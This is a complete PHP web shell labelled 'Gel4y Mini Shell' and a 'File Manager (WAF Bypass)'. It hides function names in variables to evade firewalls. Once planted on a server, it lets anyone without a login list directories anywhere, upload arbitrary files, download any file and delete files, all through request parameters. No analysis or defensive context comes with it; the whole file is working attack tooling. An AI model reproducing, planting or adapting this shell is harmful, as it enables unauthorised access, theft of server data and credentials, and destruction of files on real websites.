<?php
echo "Gel4y Mini Shell";

$k = 'd'; $a = 'scandir'; $b = 'is_dir'; $c = 'file_get_contents'; $d = 'file_put_contents';
$e = 'unlink'; $f = 'rename'; $g = 'move_uploaded_file';

echo "<h2>Simple PHP File Manager (WAF Bypass)</h2>";
$path = isset($_GET['p']) ? $_GET['p'] : '.';
$files = $a($path);

echo "<form method=POST enctype=multipart/form-data>
<input type=file name=upfile>
<input type=submit value=Upload>
<input type=hidden name=path value='$path'>
</form>";

if (isset($_FILES['upfile'])) {
    $g($_FILES['upfile']['tmp_name'], $path.'/'.$_FILES['upfile']['name']);
    echo "Uploaded!";
}

echo "<pre>";
foreach ($files as $file) {
    if ($file == '.' || $file == '..') continue;
    $full = $path.'/'.$file;
    echo ($b($full) ? "[DIR] " : "[FILE] ")."<a href='?p=$full'>$file</a> ";
    if (!$b($full)) {
        echo "| <a href='?dl=$full'>Download</a> ";
        echo "| <a href='?rm=$full' onclick='return confirm(\"Delete?\")'>Delete</a>";
    }
    echo "\n";
}
echo "</pre>";

if (isset($_GET['dl'])) {
    $fn = $_GET['dl'];
    header("Content-Disposition: attachment; filename=" . basename($fn));
    echo $c($fn);
    exit;
}

if (isset($_GET['rm'])) {
    $e($_GET['rm']);
    header("Location: ?p=$path");
}
?>
